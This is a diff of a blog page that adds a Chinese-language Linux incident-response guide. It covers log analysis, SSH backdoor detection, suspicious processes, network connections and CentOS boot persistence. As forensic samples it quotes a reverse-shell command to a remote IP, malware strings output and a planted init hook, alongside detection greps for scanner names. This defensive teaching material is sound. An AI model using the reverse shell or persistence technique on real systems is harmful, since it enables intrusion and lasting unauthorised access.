@@ -51,8 +51,8 @@
                     </h1>
                     <h2 class="headline">
                     Feb 25, 2019 00:00
-                    · 897 words
-                    · 2 minute read
+                    · 7598 words
+                    · 16 minute read
                       <span class="tags">
                       
                       
@@ -77,6 +77,12 @@
 <li><a href="#0x03-分析阶段">0x03 分析阶段</a>
 <ul>
 <li><a href="#web服务">web服务</a></li>
+<li><a href="#ssh服务">ssh服务</a></li>
+<li><a href="#进程">进程</a></li>
+<li><a href="#网络连接">网络连接</a></li>
+<li><a href="#敏感目录">敏感目录</a></li>
+<li><a href="#history">history</a></li>
+<li><a href="#开机启动">开机启动</a></li>
 </ul></li>
 </ul></li>
 </ul>
@@ -200,8 +206,715 @@ mtime 最后一次内容修改时间, vim查看会更改mtime时间
 <p>diff -r {生产dir} {测试dir}</p>
 </blockquote></li>
 
-<li></li>
+<li><p>Access Log日志</p>
+
+<p>扫描特征</p>
+
+<pre><code>通常日志中会伴随一些其他攻击特征，例如可以用如下语句
+egrep '(select|script|acunetix|sqlmap)' /var/log/httpd/access_log
+</code></pre>
+
+<p>访问频次</p>
+
+<pre><code>重点关注POST请求
+grep 'POST' /var/log/httpd/access_log | awk '{print $1}' | sort | uniq -c | sort -nr
+</code></pre>
+
+<p>Content-Length</p>
+
+<pre><code>Content-Length过大的请求，例如过滤Content-Length大于5M的日志
+awk '{if($10&gt;5000000){print $0}}' /var/log/httpd/access_log
+</code></pre></li>
 </ol>
+
+<h3 id="ssh服务">ssh服务</h3>
+
+<ol>
+<li>查看登录信息</li>
+</ol>
+
+<p>使用lastlog命令，系统中所有用户最近一次登录信息。</p>
+
+<p>登录成功:</p>
+
+<pre><code>grep 'Accepted' /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -nr
+
+last命令，它会读取位于/var/log/wtmp的文件，并把该文件记录的登录系统的用户名单，全部显示出来。
+</code></pre>
+
+<p>登录失败：</p>
+
+<pre><code>grep 'Failed' /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -nr
+
+lastb命令，会读取位于/var/log/btmp的文件，并把该文件记录的登入系统失败的用户名单，全部显示出来。
+</code></pre>
+
+<ol>
+<li>检查SSH后门</li>
+</ol>
+
+<p>比对ssh的版本</p>
+
+<pre><code>    ssh -V
+</code></pre>
+
+<p>查看ssh配置文件和/usr/sbin/sshd的时间</p>
+
+<pre><code>    stat /usr/sbin/sshd
+</code></pre>
+
+<p>strings检查/usr/sbin/sshd，看是否有邮箱信息,ip</p>
+
+<pre><code>    strings可以查看二进制文件中的字符串，在应急响应中是十分有用的。
+    strings /usr/sbin/sshd
+    strings /usr/bin/.sshd | egrep '[1-9]{1,3}.[1-9]{1,3}.'
+</code></pre>
+
+<p>通过strace监控sshd进程读写文件的操作</p>
+
+<pre><code>一般的sshd后门都会将账户密码记录到文件，可以通过strace进程跟踪到ssh登录密码文件。
+
+ps axu | grep sshd | grep -v grep
+root 65530 0.0 0.1 48428 1260 ? Ss 13:43 0:00 /usr/sbin/sshd
+strace -o aa -ff -p 65530
+grep open aa* | grep -v -e No -e null -e denied| grep WR
+aa.102586:open(&quot;/tmp/ilog&quot;, O_WRONLY|O_CREAT|O_APPEND, 0666) = 4
+</code></pre>
+
+<h3 id="进程">进程</h3>
+
+<p>检查是否存在可疑进程，需要注意如果攻击者获取到了Root权限，被植入内核或者系统层Rootkit的话，进程也会隐藏。</p>
+
+<ol>
+<li>资源占用</li>
+</ol>
+
+<p>Top然后找到CPU和MEM排序</p>
+
+<p>按照CPU排序：Shift+P</p>
+
+<p>按照MEM排序：Shift+M</p>
+
+<ol>
+<li>启动时间</li>
+</ol>
+
+<p>可疑与前面找到的Webshell时间点比对。</p>
+
+<ol>
+<li>启动权限</li>
+</ol>
+
+<p>这点很重要，比如某次应急中发现木马进程都是mysql权限执行的，如下所示：</p>
+
+<pre><code>```
+mysql 63763 45.3 0.0 12284 9616 ? R 01:18 470:54 ./db_temp/dazui.4
+mysql 63765 0.0 0.0 12284 9616 ? S 01:18 0:01 ./db_temp/dazui.4
+mysql 63766 0.0 0.0 12284 9616 ? S 01:18 0:37 ./db_temp/dazui.4
+mysql 64100 45.2 0.0 12284 9616 ? R 01:20 469:07 ./db_temp/dazui.4
+mysql 64101 0.0 0.0 12284 9616 ? S 01:20 0:01 ./db_temp/dazui.4
+```
+那基本可以判断是通过Mysql入侵，重点排查Mysql弱口令、UDF提权等。
+</code></pre>
+
+<ol>
+<li>父进程</li>
+</ol>
+
+<p>例如我在菜刀中反弹Bash</p>
+
+<p>grep -v 是反向查找的意思，比如 grep -v grep 就是查找不含有 grep 字段的行</p>
+
+<pre><code>[root@server120 html]# ps -ef | grep '/dev/tcp' | grep -v grep
+apache 26641 1014 0 14:59 ? 00:00:00 sh -c /bin/sh -c &quot;cd /root/apache-tomcat-6.0.32/webapps/ROOT/;bash -i &gt;&amp; /dev/tcp/192.168.192.144/2345 0&gt;&amp;1;echo [S];pwd;echo [E]&quot; 2&gt;&amp;1
+</code></pre>
+
+<p>父进程进程号1014</p>
+
+<pre><code>[root@server120 html]# ps -ef | grep 1014
+apache 1014 1011 0 Sep19 ? 00:00:00 /usr/sbin/httpd
+</code></pre>
+
+<p>可以看到父进程为apache，就可以判断攻击者通过Web入侵。</p>
+
+<p>获取到可疑进程号之后，可疑使用lsof -p pid查看相关文件和路径。</p>
+
+<p>例如之前遇到的十字病毒，会修改ps和netstat显示的进程名称</p>
+
+<pre><code>udp 0 0 0.0.0.0:49937 0.0.0.0:* 131683/ls -la 
+udp 0 0 0.0.0.0:47584 0.0.0.0:* 116515/ifconfig
+</code></pre>
+
+<p>使用lsof -p pid可以看到可执行文件</p>
+
+<pre><code>[root@DataNode105 admin]# lsof -p 131683
+COMMAND PID USER FD TYPE DEVICE SIZE/OFF NODE NAME
+hahidjqzx 131683 root cwd DIR 8,98 4096 18087937 /root
+hahidjqzx 131683 root rtd DIR 8,98 4096 2 /
+hahidjqzx 131683 root txt REG 8,98 625622 24123895 /usr/bin/hahidjqzxs
+</code></pre>
+
+<p>可以文件类型可以使用file获取</p>
+
+<pre><code>[root@server120 tmp]# file .zl
+zl: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, for GNU/Linux 2.6.9, not stripped
+</code></pre>
+
+<p>对于二进制的文件可以使用strings读取可读字符</p>
+
+<pre><code>[root@server120 tmp]# strings .zl
+rm -f /boot/IptabLes ; rm -f /boot/.IptabLes ; rm -f /boot/IptabLex ; rm -f /boot/.IptabLex ; rm -f /usr
+/IptabLes ; rm -f /usr/.IptabLes ; rm -f /usr/IptabLex ; rm -f /usr/.IptabLex
+netstat -anp | grep &quot;IptabLes&quot; |awk '{print $NF}' |cut -d &quot;/&quot; -f 1 | xargs kill -9 &gt; /dev/null ;free -m 
+&gt; /dev/null
+netstat -anp | grep &quot;IptabLex&quot; |awk '{print $NF}' |cut -d &quot;/&quot; -f 1 | xargs kill -9 &gt; /dev/null ;free -m 
+&gt; /dev/null
+</code></pre>
+
+<ol>
+<li>隐藏进程查看</li>
+</ol>
+
+<pre><code>ps -ef | awk '{print}' | sort -n | uniq &gt;1
+ls /proc | sort -n |uniq &gt;2
+diff 1 2
+</code></pre>
+
+<ol>
+<li>查看系统命令是否被替换</li>
+</ol>
+
+<p>查看命令目录最近的时间排序</p>
+
+<pre><code>ls -alt /usr/bin | head -10
+</code></pre>
+
+<p>根据确定时间去匹配</p>
+
+<pre><code>ls -al /bin /usr/bin /usr/sbin/ /sbin/ | grep &quot;Jan 15&quot;
+</code></pre>
+
+<h3 id="网络连接">网络连接</h3>
+
+<p>需要注意如果攻击者获取到了Root权限，被植入内核或者系统层Rootkit的话，连接是可以被隐藏的。</p>
+
+<pre><code>netstat -antlp | grep ESTABLISHED
+</code></pre>
+
+<p>查看已经建立的网络连接，例如反弹bash</p>
+
+<pre><code>[root@server120 html]# netstat -antlp | grep EST | grep bash
+tcp 0 0 192.168.192.120:41320 192.168.192.144:2345 ESTABLISHED 26643/bash
+netstat -antlp | grep LISTEN
+</code></pre>
+
+<p>检查可以监听端口，例如攻击者在本地开启sock5代理，然后使用SSH反弹sock5。</p>
+
+<pre><code>[root@server120 html]# netstat -antlp | grep LISTEN | grep 1080
+tcp 0 0 0.0.0.0:1080 0.0.0.0:* LISTEN 26810/python
+lsof -i:{port}
+</code></pre>
+
+<h3 id="敏感目录">敏感目录</h3>
+
+<p>/tmp, /var/tmp, /dev/shm，所有用户都可读，可写，可执行</p>
+
+<pre><code>[root@server120 ~]# ls -ald /tmp/
+drwxrwxrwt. 10 root root 4096 9月 20 09:41 /tmp/
+[root@server120 ~]# ls -ald /var/tmp/
+drwxrwxrwt. 2 root root 4096 9月 18 16:57 /var/tmp/
+[root@server120 ~]# ls -ald /dev/shm
+drwxrwxrwt. 3 root root 60 9月 1 10:23 /dev/shm
+</code></pre>
+
+<h3 id="history">history</h3>
+
+<p>默认的history仅记录执行的命令，然而这些对于应急来说是不够的，很多系统加固脚本会添加记录命令执行的时间，修改记录的最大条数。</p>
+
+<p>查看分析history (cat /root/.bash_history)，曾经的命令操作痕迹，以便进一步排查溯源。运气好有可能通过记录关联到如下信息：</p>
+
+<p>a) wget 远程某主机（域名&amp;IP）的远控文件；</p>
+
+<p>b) 尝试连接内网某主机（ssh scp），便于分析攻击者意图;</p>
+
+<p>c) 打包某敏感数据或代码，tar zip 类命令</p>
+
+<p>d) 对系统进行配置，包括命令修改、远控木马类，可找到攻击者关联信息…</p>
+
+<h3 id="开机启动">开机启动</h3>
+
+<p>在应急响应时，开机启动项是必查的项，下面梳理一下关于开机启动与服务相关需要排查的点。直接从init开始说。
+RHEL5、RHEL6、RHEL7的init系统分别为SysV init、Upstart、Systemd</p>
+
+<ol>
+<li>centos6
+<br /></li>
+</ol>
+
+<p>开机启动流程</p>
+
+<pre><code>1.post加电自检
+这个过程是开机后，BIOS或UEFI进行硬件检查的阶段
+
+2.MBR引导
+自检硬件没有问题时候，这里以BIOS为例，BIOS将会直接去找硬盘的第一个扇区，找到前446字节，将MBR加载到内存中，MBR将告诉程序下一阶段去哪里找系统grub引导。此阶段属于grub的第一阶段。grub还有1.5阶段和2阶段。
+
+3.GRUB引导
+grub第1.5和2阶段，信息默认存放在扇区中,如果使用grub-install生成的2阶段的文件是存放在/boot分区中的。 
+为了加载内核系统，不得不加载/boot分区，而加载/boot分区，需要有/boot分区的驱动，/boot分区驱动是放在/boot分区中的,啊，我们好像进入了死循环了，Linux是怎么解决的呢？就是靠放在1.5阶段中的数据，是放在第一个扇区后的后续扇区中，具体占用多少字节，不太清楚，只知道1.5阶段和2阶段总共27个扇区。
+
+stage1.5：
+mbr之后的扇区，识别stage2所在的分区上的文件系统
+
+stage2：
+开机启动的时候看到的Grub选项、信息，还有修改GRUB背景等功能都是stage2提供的，stage2会去读入/boot/grub/grub.conf或者menu.lst等配置文件
+
+4.读取grub.conf文件
+读取grub.conf文件以确定内核启动的参数，准备启动内核
+
+5.启动内核
+加载内核，核心开始解压缩，启动一些最核心的程序。 
+因为为了让内核足够轻小，硬件驱动并没有放在内核文件里面，我们可以看到内核很小,才4M左右，我们可以想象Windows中的驱动，安装系统时候还需要使用驱动软件下载好长时间呢 
+因此需要使用/initramfs-2.6.32-696.el6.x86_64.img来驱动硬件
+
+[root@CentOS6 ~]# ll -h /boot/vmlinuz-2.6.32-696.el6.x86_64
+-r-xr-xr-x. 1 root root 4.1M Jul  8 21:06 /boot/vmlinuz-2.6.32-696.el6.x86_64
+
+6.加载伪文件系统（ramdisk），
+内核已将启动起来了，再调用ramdisk文件，尝试驱动所有的硬件设备，到这一步，内核起来了，所有驱动也装上了，因此后面的启动就可以交给程序了
+
+7.启动init进程
+grub中默认指定init=/sbin/init程序，可以在grub.conf中kernel行自定义执行程序init=/bin/bash,此时可以绕过下面步骤直接进入bash界面。 
+内核源代码文件中显示996行左右，规定了init启动的顺序，/sbin/init-&gt;/etc/init-&gt;/bin/init-&gt;/bin/sh,/bin/bash没有写，应该是和/bin/sh一样吧
+
+(1)读取/etc/inittab文件
+inittab文件里面定义了系统默认运行级别，这一步做了一些工作如下：
+
+ a)初始运行级别(RUN LEVEL)
+ b)系统初始化脚本
+ c)对应运行级别的脚本目录
+ d)定义UPS电源终端/恢复脚本
+ e)在虚拟控制台生成getty,以生成终端
+ f)在运行级别5初始化X
+
+(2)执行/etc/rc.d/rc.sysinit程序
+系统初始化一些脚本，主要完成以下工作
+
+a)设置主机名
+b)设置欢迎信息
+c)激活udev和selinux可以在grub.conf中,kernel行添加selinux=0以关闭selinux
+d)挂载/etc/fstab文件中定义的文件系统
+e)检测根文件系统，并以读写方式重新挂载根文件系统
+f)设置系统时钟
+g)激活swap设备
+h)根据/etc/sysctl.conf文件设置内核参数
+i)激活lvm及software raid设备
+j)加载额外设备的驱动程序
+k)清理操作
+
+(3)/etc/rc#.d/文件（各种服务）
+里面定义的是各种服务的启动脚本，可以ls查看，S开头代表开机启动的服务，K开头的是关机要执行的任务。#代表数字，一个数字代表一个运行级别，共7个运行级别，这里就不多说了
+
+(4)/etc/rc.d/rc.local文件
+这里面可以自定义开机启动的命令。
+
+8.执行/bin/login
+执行/bin/login程序，等待用户登录
+</code></pre>
+
+<p>init会读取配置文件/etc/inittab 和 /etc/init/*.conf。先看一下/etc/inittab</p>
+
+<pre><code>[root@server120 src]# cat /etc/inittab
+# inittab is only used by upstart for the default runlevel.
+#
+# ADDING OTHER CONFIGURATION HERE WILL HAVE NO EFFECT ON YOUR SYSTEM.
+#
+# System initialization is started by /etc/init/rcS.conf
+#
+# Individual runlevels are started by /etc/init/rc.conf
+#
+# Ctrl-Alt-Delete is handled by /etc/init/control-alt-delete.conf
+#
+# Terminal gettys are handled by /etc/init/tty.conf and /etc/init/serial.conf,
+# with configuration in /etc/sysconfig/init.
+#
+# For information on how to write upstart event handlers, or how
+# upstart works, see init(5), init(8), and initctl(8).
+#
+# Default runlevel. The runlevels used are:
+#   0 - halt (Do NOT set initdefault to this)
+#   1 - Single user mode
+#   2 - Multiuser, without NFS (The same as 3, if you do not have networking)
+#   3 - Full multiuser mode
+#   4 - unused
+#   5 - X11
+#   6 - reboot (Do NOT set initdefault to this)
+# 
+id:3:initdefault:
+</code></pre>
+
+<p>通过注释可以看到，upstart只使用inittab读取默认的runlevel。添加其他的配置都不会生效，其他的配置都移动到了/etc/init/*.conf下。</p>
+
+<p>系统初始化/etc/init/rcS.conf</p>
+
+<p>对应runlevel的服务启动/etc/init/rc.conf</p>
+
+<p>终端配置/etc/init/tty.conf</p>
+
+<p>总结一下，针对CentOS6系统，需要排查的点：</p>
+
+<p>1）/etc/init/*.conf</p>
+
+<p>vim tty.conf，添加一行</p>
+
+<p><code>exec /bin/vinc</code></p>
+
+<p>vinc内容</p>
+
+<pre><code>[root@vincenthostname init]# cat /bin/vinc 
+#!/bin/bash
+
+touch /tmp/vinc
+</code></pre>
+
+<p>2）/etc/rc.d/rc.sysinit
+3）/etc/rc.d/init.d
+4）/etc/rc.d/rc.local</p>
+
+<ol>
+<li>centos7</li>
+</ol>
+
+<p>开机启动流程如下：</p>
+
+<pre><code>1）UEFi或BIOS初始化，运行POST开机自检
+2）选择启动设备
+3）引导装载程序, centos7是grub2
+4）加载装载程序的配置文件： /etc/grub.d/   /etc/default/grub    /boot/grub2/grub.cfg
+5）加载initramfs驱动模块
+6）加载内核选项
+7）内核初始化， centos7使用systemd代替init
+8）执行initrd.target所有单元，包括挂载/etc/fstab
+9）从initramfs根文件系统切换到磁盘根目录
+10）systemd执行默认target配置，配置文件/etc/systemd/system/default.target
+11）systemd执行sysinit.target初始化系统及basic.target准备操作系统
+12）systemd启动multi-user.target下的本机与服务器服务
+13）systemd执行multi-user.target下的/etc/rc.d/rc.local
+14）systemd执行multi-user.target下的getty.target及登入服务
+15）systemd执行graphical需要的服务
+</code></pre>
+
+<p>CentOS7使用的是systemd，相较于以前的init有很大的不同。</p>
+
+<p>/etc/inittab是空的</p>
+
+<pre><code>[root@localhost init.d]# cat /etc/inittab | grep -v &quot;^$&quot; | grep -v &quot;^#&quot;
+[root@localhost init.d]#
+</code></pre>
+
+<p>也没有/etc/init目录</p>
+
+<pre><code>[root@localhost init.d]# ls -al /etc/init
+ls: cannot access /etc/init: No such file or directory
+</code></pre>
+
+<p>/etc/rc3.d/和/etc/rc.d/init.d/还存在，所以向后兼容sysv init脚本，在centos5、6系统上/etc/init.d/目录下的服务脚本，systemd也能够对其进行管理</p>
+
+<pre><code>[root@localhost init.d]# ls -al /etc/rc3.d/
+
+total 4
+
+drwxr-xr-x.  2 root root   81 May 30 14:09 .
+
+drwxr-xr-x. 10 root root 4096 May 30 14:31 ..
+
+lrwxrwxrwx.  1 root root   20 Nov  7  2016 K50netconsole -&gt; ../init.d/netconsole
+
+lrwxrwxrwx.  1 root root   17 Nov  7  2016 S10network -&gt; ../init.d/network
+
+lrwxrwxrwx.  1 root root   23 Jan 17  2017 S90zabbix_agentd -&gt; ../init.d/zabbix_agentd
+
+lrwxrwxrwx.  1 root root   15 May 30 14:09 S99ossec -&gt; ../init.d/ossec
+</code></pre>
+
+<p>systemd提供更优秀的框架以表示系统服务间的依赖关系，尽可能启动更少进程，尽可能将更多进程并行启动，尽可能减少对shell脚本的依赖。systemd的核心概念是unit，unit表示不同类型的systemd对象，通过配置文件进行标识和配置，文件中主要包含了系统服务，监听socket，保存的系统快照以及其他与init相关的信息。</p>
+
+<p>查看所有的unit类型：</p>
+
+<pre><code>[root@localhost system]# systemctl -t help       
+Available unit types:
+service
+socket
+busname
+target
+snapshot
+device
+mount
+automount
+swap
+timer
+path
+slice
+scope
+</code></pre>
+
+<p>用途如下：</p>
+
+<pre><code>Service unit：文件扩展名.service 用于定义系统服务
+Target unit：文件扩展名.target 用于模拟实现运行级别
+Device unit： .device 用于定义内核识别的设备
+Mount unit： .mount 定义文件系统的挂载点
+Socket unit： .socket 用于标识进程间通行用的socket文件，也可在系统启动时，延迟启动服务，实现按需启动
+Snapshot unit： .snapshot 管理系统快照
+Swap unit： .swap 用于标识swap设备
+Automount unit： .automount 文件系统的自动挂载点
+Path unit： .path 用于定义文件系统中的一个文件或目录使用，常用于当文件系统变化时，延迟激活服务，如spool目录
+</code></pre>
+
+<p>配置文件中主要保存在：</p>
+
+<pre><code>/usr/lib/systemd/system/    每个服务最主要的启动脚本设置，类似于之前的/etc/init.d/ 
+
+/run/systemd/system/    系统执行过程中所产生的服务脚本，比上面目录优先运行
+
+/etc/systemd/system/    管理员建立的执行脚本，类似于/etc/rc.d/rcN.d/Sxx类的功能，比上面目录优先运行
+</code></pre>
+
+<pre><code>[root@localhost system]# ls /usr/lib/systemd/system/
+
+abrt-ccpp.service                       psacct.service
+
+abrtd.service                           quotaon.service
+
+abrt-oops.service                       rc-local.service
+
+...
+
+[root@localhost system]# ls /run/systemd/system/
+
+session-1006.scope      session-161401.scope    session-24243.scope    session-54837.scope
+
+session-1160.scope      session-162551.scope    session-24243.scope.d  session-54837.scope.d
+
+...
+
+[root@localhost system]# ls /etc/systemd/system/
+
+basic.target.wants                           default.target           sockets.target.wants
+
+dbus-org.fedoraproject.FirewallD1.service    default.target.wants     sysinit.target.wants
+
+dbus-org.freedesktop.NetworkManager.service  getty.target.wants       system-update.target.wants
+
+dbus-org.freedesktop.nm-dispatcher.service   multi-user.target.wants
+</code></pre>
+
+<p>我们来看下sshd.service</p>
+
+<pre><code>[root@localhost system]# cat sshd.service | grep -v &quot;^$&quot; | grep -v &quot;^#&quot;
+
+[Unit]
+
+Description=OpenSSH server daemon
+
+Documentation=man:sshd(8) man:sshd_config(5)
+
+After=network.target sshd-keygen.service
+
+Wants=sshd-keygen.service
+
+[Service]
+
+EnvironmentFile=/etc/sysconfig/sshd
+
+ExecStart=/usr/sbin/sshd -D $OPTIONS
+
+ExecReload=/bin/kill -HUP $MAINPID
+
+KillMode=process
+
+Restart=on-failure
+
+RestartSec=42s
+
+[Install]
+
+WantedBy=multi-user.target
+</code></pre>
+
+<p>文件包含三部分。</p>
+
+<p>[Unit]：描述信息与依赖关系
+[Service]：ExecStartPre 定义启动服务之前应该运行的命令；ExecStart 定义启动服务的具体命令行语法。
+[Install]：WangtedBy 表明这个服务是在多用户模式下所需要的。
+我们再来看下multi-user.target</p>
+
+<pre><code>[root@localhost system]# cat multi-user.target | grep -v &quot;^$&quot; | grep -v &quot;^#&quot;
+
+[Unit]
+
+Description=Multi-User System
+
+Documentation=man:systemd.special(7)
+
+Requires=basic.target
+
+Conflicts=rescue.service rescue.target
+
+After=basic.target rescue.service rescue.target
+
+AllowIsolate=yes
+</code></pre>
+
+<p>Requires表明 multi-user.target 启动的时候 basic.target 也必须被启动，basic.target 停止的时候，multi-user.target 也必须停止。接着查看 basic.target 文件，会发现它又指定了 sysinit.target 等其他的单元必须随之启动。同样 sysinit.target 也会包含其他的单元。采用这样的层层链接的结构，最终所有需要支持多用户模式的组件服务都会被初始化启动好。</p>
+
+<p>此外在/etc/systemd/system 目录下还可以看到诸如*.wants 的目录</p>
+
+<pre><code>[root@localhost system]# ls multi-user.target.wants/   
+
+brandbot.path  plymouth-quit.service           systemd-logind.service
+
+dbus.service   plymouth-quit-wait.service      systemd-update-utmp-runlevel.service
+
+getty.target   systemd-ask-password-wall.path  systemd-user-sessions.service
+</code></pre>
+
+<p>放在该目录下的配置单元文件等同于在[Unit]小节中的 wants 关键字，即本单元启动时，还需要启动这些单元。</p>
+
+<p>查看multi-user.target的依赖关系</p>
+
+<pre><code>[root@localhost system]# systemctl list-dependencies multi-user.target     
+
+multi-user.target
+
+├─abrt-ccpp.service
+├─abrt-oops.service
+├─abrt-vmcore.service
+├─abrt-xorg.service
+├─abrtd.service
+├─atd.service
+├─auditd.service
+</code></pre>
+
+<p>查看systemd管理的所有单元</p>
+
+<pre><code>[root@localhost system]# systemctl list-unit-files
+UNIT FILE                                   STATE  
+proc-sys-fs-binfmt_misc.automount           static 
+dev-hugepages.mount                         static 
+dev-mqueue.mount                            static
+</code></pre>
+
+<p>查看服务状态</p>
+
+<pre><code>[root@localhost system]# systemctl list-unit-files --type service     
+UNIT FILE                                   STATE  
+abrt-ccpp.service                           enabled
+abrt-oops.service                           enabled
+</code></pre>
+
+<p>State的状态如下：</p>
+
+<pre><code>loaded:Unit配置文件已处理
+active(running):一次或多次持续处理的运行
+active(exited):成功完成一次性的配置
+active(waiting):运行中，等待一个事件
+inactive:不运行
+enabled:开机启动
+disabled:开机不启动
+static:开机不启动，但可被另一个启用的服务激活
+</code></pre>
+
+<p>使用 systemctl 控制单元时，通常需要使用单元文件的全名，包括扩展名（例如 sshd.service），如果无扩展名，systemctl 默认把扩展名当作 .service。</p>
+
+<p>启动httpd服务</p>
+
+<pre><code>[root@localhost system]# systemctl start httpd
+</code></pre>
+
+<p>停止httpd服务</p>
+
+<pre><code>[root@localhost system]# systemctl stop httpd
+</code></pre>
+
+<p>查看httpd服务运行状态</p>
+
+<pre><code>[root@localhost system]# systemctl status httpd
+</code></pre>
+
+<p>在centOS7上由.target来代替运行级别。</p>
+
+<p>查看我们的机器上有多少个target</p>
+
+<pre><code>[root@localhost system]# ls /usr/lib/systemd/system/*.target | head -n 5
+/usr/lib/systemd/system/basic.target
+/usr/lib/systemd/system/bluetooth.target
+/usr/lib/systemd/system/cryptsetup-pre.target
+/usr/lib/systemd/system/cryptsetup.target
+/usr/lib/systemd/system/ctrl-alt-del.target
+</code></pre>
+
+<p>运行级别与target的对照如下：</p>
+
+<pre><code>runlevel0.target -&gt; poweroff.target
+runlevel1.target -&gt; rescue.target
+runlevel2.target -&gt; multi-user.target
+runlevel3.target -&gt; multi-user.target
+runlevel4.target -&gt; multi-user.target
+runlevel5.target -&gt; graphical.target
+runlevel6.target -&gt; reboot.target
+</code></pre>
+
+<p>运行级别切换</p>
+
+<p>在centOS6上，我们切换级别使用init，在centOS7上来切换用：</p>
+
+<pre><code>systemctl isolate poweroff.target
+</code></pre>
+
+<p>要想切换运行级别，AllowIsolate=yes才可以。</p>
+
+<pre><code>[root@localhost system]# cat poweroff.target | grep Allow
+AllowIsolate=yes
+</code></pre>
+
+<p>修改文件需执行systemctl daemon-reload才能生效。</p>
+
+<p>查看默认运行级别</p>
+
+<pre><code>[root@localhost system]# systemctl get-default
+multi-user.target
+</code></pre>
+
+<p>修改默认运行级别</p>
+
+<pre><code>[root@localhost system]# systemctl set-default graphical.target
+Removed symlink /etc/systemd/system/default.target.
+Created symlink from /etc/systemd/system/default.target to /usr/lib/systemd/system/graphical.target.
+</code></pre>
+
+<p>查看开机启动程序(相当于chkconfig –list)</p>
+
+<pre><code>ls /etc/systemd/system/multi-user.target.wants/
+</code></pre>
+
+<p>开机启动（相当于chkconfig httpd on）</p>
+
+<pre><code>[root@localhost system]# systemctl enable httpd.service 
+Created symlink from /etc/systemd/system/multi-user.target.wants/httpd.service to /usr/lib/systemd/system/httpd.service.
+</code></pre>
+
+<p>去除开机启动（相当于chkconfig httpd off）</p>
+
+<pre><code>[root@localhost system]# systemctl disable httpd.service                                
+Removed symlink /etc/systemd/system/multi-user.target.wants/httpd.service.
+</code></pre>
+
+<p>查看服务是否开机启动（相当于chkconfig –list httpd）</p>
+
+<pre><code>[root@localhost system]# systemctl is-enabled httpd.service
+enabled
+</code></pre>
 
                 </section>
             </article>
